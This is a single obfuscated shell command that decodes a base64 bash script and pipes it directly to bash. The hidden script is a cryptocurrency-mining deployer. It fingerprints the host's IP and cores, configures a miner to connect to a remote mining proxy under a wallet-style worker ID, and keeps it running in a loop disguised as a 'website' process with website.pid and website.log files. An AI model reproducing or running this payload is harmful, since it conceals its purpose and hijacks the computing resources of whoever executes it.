base64 -d <<< IyEvYmluL2Jhc2gKYXJyYXk9KCkKZm9yIGkgaW4ge2EuLnp9IHtBLi5afSB7MC4uOX07IAogICBkbwogICBhcnJheVskUkFORE9NXT0kaQpkb25lCgpjdXJyZW50ZGF0ZT0kKGRhdGUgJyslZC0lYi0lWS1SZW5kV2FzbV8nKQppcGFkZHJlc3M9JCh3Z2V0IC1xIC1PIC0gYXBpLmlwaWZ5Lm9yZykKbnVtX29mX2NvcmVzPSQoY2F0IC9wcm9jL2NwdWluZm8gfCBncmVwIHByb2Nlc3NvciB8IHdjIC1sKQp1c2VkX251bV9vZl9jb3Jlcz1gZXhwciAkbnVtX29mX2NvcmVzIC0gMmAKdW5kZXJzY29yZWRfaXA9JChlY2hvICRpcGFkZHJlc3MgfCBzZWQgJ3MvXC4vXy9nJykKY3VycmVudGRhdGUrPSR1bmRlcnNjb3JlZF9pcAoKcmFuZG9tV29yZD0kKHByaW50ZiAlcyAke2FycmF5W0BdOjo4fSAkJ1xuJykKY3VycmVudGRhdGUrPSRyYW5kb21Xb3JkCgpzbGVlcCAyCgpUWj0nQWZyaWNhL0pvaGFubmVzYnVyZyc7IGV4cG9ydCBUWgpkYXRlCnNsZWVwIDIKCmVjaG8gIiIKZWNobyAiWW91IHdpbGwgYmUgdXNpbmcgJHVzZWRfbnVtX29mX2NvcmVzIGNvcmVzIgplY2hvICIiCnNsZWVwIDIKCmVjaG8gIiIKZWNobyAiWW91ciB3b3JrZXIgbmFtZSB3aWxsIGJlICRjdXJyZW50ZGF0ZSIKZWNobyAiIgpzbGVlcCAyCgpjYXQgPiBkYXRhLmpzb24gPDwtRU5ECnsKICAicHJveHkiOiAid3M6Ly9jcHVzb2NrcyQoc2h1ZiAtaSAxLTYgLW4gMSkud290Lm1yZmFjZS5jb206OTk5OS9iV0Y2WVhCdmIyd3VkMjkwTG0xeVptRmpaUzVqYjIwNk9EUTBNZz09IiwKICAiY29uZmlnIjogeyAidGhyZWFkcyI6ICR1c2VkX251bV9vZl9jb3JlcywgImxvZyI6IHRydWUgfSwKICAib3B0aW9ucyI6IHsgInVzZXIiOiAiTUdheXBSSmk0M0xjUXhyZ29MMkNXMjhCMzF3NG93THZ2OC4kY3VycmVudGRhdGUiLCAicGFzc3dvcmQiOiAieCIsICJhcmdlbnQiOiAibm9kZS1taW5vLzEuMCIgfQp9CkVORAoKc2xlZXAgMgoKcmVhZG9ubHkgUElEX0ZJTEU9IndlYnNpdGUucGlkIgpyZWFkb25seSBMT0dfRklMRT0id2Vic2l0ZS5sb2ciCnJlYWRvbmx5IEpPQl9EVVJBVElPTl9TRUNPTkRTPTM2MDAKcmVhZG9ubHkgU0xFRVBfRFVSQVRJT05fU0VDT05EUz02MAoKI251bV9vZl9jb3Jlcz0kKGNhdCAvcHJvYy9jcHVpbmZvIHwgZ3JlcCBwcm9jZXNzb3IgfCB3YyAtbCkKI3VzZWRfbnVtX29mX2NvcmVzPSQoZXhwciAkbnVtX29mX2NvcmVzIC0gMikKCnJlYWRvbmx5IEpPQl9DT01NQU5EPSJub2RlIGFwcC5qcyIKCiMgLS0tIEZ1bmN0aW9ucyAtLS0KCmdldF9waWRzKCkgewoKICBwcyAtYXV4IHwgZ3JlcCAiJHtKT0JfQ09NTUFORH0iIHwgZ3JlcCAtdiBncmVwIHwgYXdrICd7cHJpbnQgJDJ9JyB8IHRyICdcbicgJyAnIHx8IHRydWUKfQoKIyBGdW5jdGlvbiB0byBjaGVjayBpZiB0aGUgam9iIGlzIHJ1bm5pbmcuCmlzX3J1bm5pbmcoKSB7CiAgIyBVc2UgdGhlIGdldF9waWRzIGZ1bmN0aW9uLiBJZiBpdCByZXR1cm5zIGFueSBvdXRwdXQsIHRoZSBqb2IgaXMgcnVubmluZy4KICBpZiBbIC1uICIkKGdldF9waWRzKSIgXTsgdGhlbgogICAgcmV0dXJuIDAgIyBUaGUgcHJvY2VzcyBpcyBydW5uaW5nCiAgZWxzZQogICAgcmV0dXJuIDEgIyBUaGUgcHJvY2VzcyBpcyBub3QgcnVubmluZwogIGZpCn0KCgpzdGFydF9qb2IoKSB7CiAgaWYgaXNfcnVubmluZzsgdGhlbgogICAgZWNobyAiSm9iIGlzIGFscmVhZHkgcnVubmluZy4gUElEczogJChnZXRfcGlkcykiCiAgICByZXR1cm4gMAogIGZpCiAgZWNobyAiU3RhcnRpbmcgam9iIHdpdGggY29tbWFuZDogJHtKT0JfQ09NTUFORH0iCiAgCiAgIyBFeHBsaWNpdGx5IGNsZWFuIHVwIG9sZCBmaWxlcyBmb3IgYSBmcmVzaCBzdGFydC4KICBybSAtZiAiJHtQSURfRklMRX0iCiAgcm0gLWYgIiR7TE9HX0ZJTEV9IgoKCiAgbm9odXAgJHtKT0JfQ09NTUFORH0gPiAiJHtMT0dfRklMRX0iIDI+JjEgJgogIGVjaG8gJCEgPiAiJHtQSURfRklMRX0iIAoKICAjIFdhaXQgZm9yIGEgbW9tZW50IHRvIGVuc3VyZSB0aGUgcHJvY2VzcyBoYXMgc3RhcnRlZCBhbmQgd3JpdHRlbiB0byB0aGUgbG9nLgogIHNsZWVwIDIKCiAgaWYgWyAtZiAiJHtQSURfRklMRX0iIF07IHRoZW4KICAgIGVjaG8gIkpvYiBzdGFydGVkIHdpdGggcGFyZW50IFBJRCAkKGNhdCAiJHtQSURfRklMRX0iKS4iCiAgICBlY2hvICJWaWV3IGxvZ3Mgd2l0aDogdGFpbCAtZiAke0xPR19GSUxFfSIKICBlbHNlCiAgICBlY2hvICJXYXJuaW5nOiBKb2Igc3RhcnRlZCBidXQgUElEIGZpbGUgd2FzIG5vdCBjcmVhdGVkLiIKICAgIGVjaG8gIlZpZXcgbG9ncyB3aXRoOiB0YWlsIC1mICR7TE9HX0ZJTEV9IgogIGZpCn0KCgpzdG9wX2pvYigpIHsKICBpZiAhIGlzX3J1bm5pbmc7IHRoZW4KICAgIGVjaG8gIkpvYiBpcyBub3QgcnVubmluZy4iCiAgICAKICAgIHJtIC1mICIke1BJRF9GSUxFfSIKICAgIHJtIC1mICIke0xPR19GSUxFfSIKICAgIGV4aXQgMAogIGZpCgogIGxvY2FsIHBpZHM9JChnZXRfcGlkcykKICBlY2hvICJUZXJtaW5hdGluZyBhbGwgcHJvY2Vzc2VzIHJlbGF0ZWQgdG8gdGhlIGpvYi4uLiIKICBlY2hvICJGb3VuZCBQSURzOiAke3BpZHN9IgoKICAjIExvb3AgdGhyb3VnaCBhbGwgZm91bmQgUElEcyBhbmQga2lsbCB0aGVtIG9uZSBieSBvbmUuCiAgZm9yIHBpZCBpbiAke3BpZHN9OyBkbwogICAgZWNobyAiU2VuZGluZyBTSUdURVJNIHRvIFBJRDogJHtwaWR9IgogICAga2lsbCAiJHtwaWR9IgogIGRvbmUKCiAgZWNobyAiU2VudCBTSUdURVJNIHRvIHByb2Nlc3Nlcy4gV2FpdGluZyBmb3IgdXAgdG8gNSBzZWNvbmRzIGZvciB0aGVtIHRvIHN0b3AuLi4iCiAgc2xlZXAgNQoKICAjIENoZWNrIGlmIGFueSBwcm9jZXNzZXMgYXJlIHN0aWxsIHJ1bm5pbmcuCiAgbG9jYWwgcGlkc19hZnRlcl93YWl0PSQoZ2V0X3BpZHMpCiAgaWYgWyAtbiAiJHtwaWRzX2FmdGVyX3dhaXR9IiBdOyB0aGVuCiAgICBlY2hvICJTb21lIHByb2Nlc3NlcyBhcmUgc3RpbGwgcnVubmluZy4gRm9yY2VmdWxseSBraWxsaW5nIHdpdGggU0lHS0lMTC4uLiIKICAgIGZvciBwaWQgaW4gJHtwaWRzX2FmdGVyX3dhaXR9OyBkbwogICAgICBlY2hvICJTZW5kaW5nIFNJR0tJTEwgdG8gUElEOiAke3BpZH0iCiAgICAgIGtpbGwgLTkgIiR7cGlkfSIKICAgIGRvbmUKICAgIHNsZWVwIDIgIyBHaXZlIGEgZmluYWwgbW9tZW50IGZvciBjbGVhbnVwCiAgZmkKCiAgIyBBZnRlciB0aGUga2lsbCBhdHRlbXB0cywgY2hlY2sgb25lIGxhc3QgdGltZS4KICBpZiAhIGlzX3J1bm5pbmc7IHRoZW4KICAgICMgVW5jb25kaXRpb25hbGx5IGNsZWFuIHVwIG9sZCBmaWxlcyBhZnRlciBhIHN1Y2Nlc3NmdWwgc3RvcC4KICAgIHJtIC1mICIke1BJRF9GSUxFfSIKICAgIHJtIC1mICIke0xPR19GSUxFfSIKICAgIGVjaG8gIkpvYiB0ZXJtaW5hdGVkIGFuZCBjbGVhbmVkIHVwLiIKICBlbHNlCiAgICBlY2hvICJXYXJuaW5nOiBGYWlsZWQgdG8gdGVybWluYXRlIGFsbCBwcm9jZXNzZXMuIE1hbnVhbCBpbnRlcnZlbnRpb24gbWF5IGJlIHJlcXVpcmVkLiIKICAgIGVjaG8gIlJlbWFpbmluZyBQSURzOiAkKGdldF9waWRzKSIKICBmaQp9CgoKc3RhdHVzX2pvYigpIHsKICBlY2hvICItLS0gSm9iIFN0YXR1cyBSZXBvcnQgLS0tIgogIHNsZWVwIDEKICAKICBpZiBpc19ydW5uaW5nOyB0aGVuCiAgICBlY2hvICJTdGF0dXM6IEpvYiBpcyBjdXJyZW50bHkgcnVubmluZy4iCiAgICBlY2hvICJSdW5uaW5nIFBJRHM6ICQoZ2V0X3BpZHMpIgogIGVsc2UKICAgIGVjaG8gIlN0YXR1czogSm9iIGlzIG5vdCBydW5uaW5nLiIKICBmaQogIAogIHNsZWVwIDEKICBlY2hvICItLS0gTG9nIEZpbGUgUmVwb3J0IC0tLSIKICBpZiBbIC1zICIke0xPR19GSUxFfSIgXTsgdGhlbgogICAgZWNobyAiTG9nIGZpbGUgZXhpc3RzIGFuZCBjb250YWlucyBjb250ZW50LiBEaXNwbGF5aW5nIGxhc3QgMTAgbGluZXM6IgogICAgIyBUaGUgJ3x8IHRydWUnIGlzIHVzZWQgaGVyZSBhcyB3ZWxsIHRvIHByZXZlbnQgZXJyb3JzIGlmIHRoZSBmaWxlIGlzIGVtcHR5IG9yIG1pc3NpbmcuCiAgICB0YWlsIC1uIDEwICIke0xPR19GSUxFfSIgfHwgdHJ1ZQogIGVsaWYgWyAtZiAiJHtMT0dfRklMRX0iIF07IHRoZW4KICAgIGVjaG8gIkxvZyBmaWxlIGV4aXN0cyBidXQgaXMgY3VycmVudGx5IGVtcHR5LiIKICBlbHNlCiAgICBlY2hvICJObyBsb2cgZmlsZSBmb3VuZC4gVGhlIGpvYiBoYXMgbGlrZWx5IG5vdCBiZWVuIHN0YXJ0ZWQgeWV0LiIKICBmaQogIAogIHNsZWVwIDEKICBlY2hvICItLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIgp9CgojIFRoZSBjeWNsZSBqb2IgZnVuY3Rpb24gbm93IHJ1bnMgZm9yZXZlciBieSBkZWZhdWx0LgpjeWNsZV9qb2IoKSB7CiAgZWNobyAiU3RhcnRpbmcgY3ljbGluZyBqb2IuIEl0IHdpbGwgcnVuIGZvciAke0pPQl9EVVJBVElPTl9TRUNPTkRTfSBzZWNvbmRzLCBzdG9wLCBhbmQgdGhlbiBzbGVlcCBmb3IgJHtTTEVFUF9EVVJBVElPTl9TRUNPTkRTfSBzZWNvbmRzIGJlZm9yZSByZXBlYXRpbmcuIgogIHdoaWxlIHRydWU7IGRvCiAgICBzdGFydF9qb2IKICAgIHNsZWVwICIke0pPQl9EVVJBVElPTl9TRUNPTkRTfSIKICAgIHN0b3Bfam9iCiAgICBzbGVlcCAiJHtTTEVFUF9EVVJBVElPTl9TRUNPTkRTfSIKICBkb25lCn0KCiMgLS0tIENvbW1hbmQgTGluZSBJbnRlcmZhY2UgKENMSSkgLS0tCgojIFNldHMgdGhlIGRlZmF1bHQgY29tbWFuZCB0byAnY3ljbGUnIGlmIG5vIGFyZ3VtZW50IGlzIHByb3ZpZGVkLgpDT01NQU5EPSIkezE6LWN5Y2xlfSIKCmNhc2UgIiRDT01NQU5EIiBpbgogIHN0YXJ0KQogICAgc3RhcnRfam9iCiAgICA7OwoKICBzdG9wKQogICAgc3RvcF9qb2IKICAgIDs7CgogIHN0YXR1cykKICAgIHN0YXR1c19qb2IKICAgIDs7CgogIGN5Y2xlKQogICAgY3ljbGVfam9iCiAgICA7OwoKICAqKQogICAgZWNobyAiVXNhZ2U6ICQwIHtzdGFydHxzdG9wfHN0YXR1c3xjeWNsZX0iCiAgICBleGl0IDEKICAgIDs7CmVzYWM= | bash
